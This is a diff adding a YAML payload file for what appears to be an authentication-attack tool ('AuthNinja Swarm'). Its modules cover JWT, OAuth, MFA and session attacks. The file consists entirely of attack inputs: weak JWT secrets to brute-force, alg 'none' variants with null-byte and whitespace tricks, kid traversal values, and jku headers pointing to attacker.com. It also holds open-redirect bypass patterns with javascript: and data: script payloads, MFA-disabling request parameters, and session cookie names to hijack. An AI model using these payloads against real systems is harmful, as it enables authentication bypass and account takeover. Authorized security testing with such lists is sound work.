@@ -1,0 +1,80 @@
+# AuthNinja Swarm Payloads
+
+jwt_inspector:
+  weak_secrets:
+    - "secret"
+    - "password"
+    - "123456"
+    - "jwt_secret"
+    - "changeme"
+    - "test"
+    - "development"
+    - "production"
+    - "your-256-bit-secret"
+    - "shhhhh"
+    - "supersecret"
+
+  alg_none_variants:
+    - "none"
+    - "None"
+    - "NONE"
+    - "nOnE"
+    - "none\x00" # Null byte injection
+    - "none\t" # Tab injection
+    - "none " # Trailing space
+    - " none" # Leading space
+
+  kid_injection_patterns:
+    - kid: "../../dev/null"
+    - kid: "/dev/null"
+    - kid: "none"
+    - jku: "https://attacker.com/jwks.json"
+    - jku: "{target}/../../attacker.com/jwks.json"
+
+oauth_dancer:
+  redirect_bypass_patterns:
+    # URL confusion
+    - "{legitimate}@{evil}"
+    - "{legitimate}.{evil}"
+    - "{evil}#{legitimate}"
+    - "{evil}?{legitimate}"
+    - "{evil}%00{legitimate}"
+    - "{evil}%0d%0a{legitimate}"
+    # Path traversal
+    - "{legitimate}/../{evil}"
+    - "{legitimate}/..;/{evil}"
+    # Subdomain tricks
+    - "{legitimate_host}.{evil_domain}"
+    - "{evil_subdomain}.{legitimate_domain}"
+    # Protocol confusion
+    - "javascript://{legitimate}%0aalert(1)"
+    - "data:text/html,<script>location='{evil}'</script>"
+
+mfa_bypasser:
+  bypass_params:
+    - { mfa_required: false }
+    - { mfa_enabled: false }
+    - { two_factor: false }
+    - { 2fa: false }
+    - { otp_required: false }
+    - { skip_mfa: true }
+    - { mfa_verified: true }
+    - { totp_verified: true }
+
+  response_fields:
+    - "mfa_required"
+    - "mfa_enabled"
+    - "two_factor_required"
+    - "2fa_required"
+    - "otp_required"
+    - "requires_mfa"
+    - "needs_2fa"
+
+session_hijacker:
+  session_cookie_names:
+    - "PHPSESSID"
+    - "JSESSIONID"
+    - "sessionid"
+    - "session"
+    - "sid"
+    - "auth"
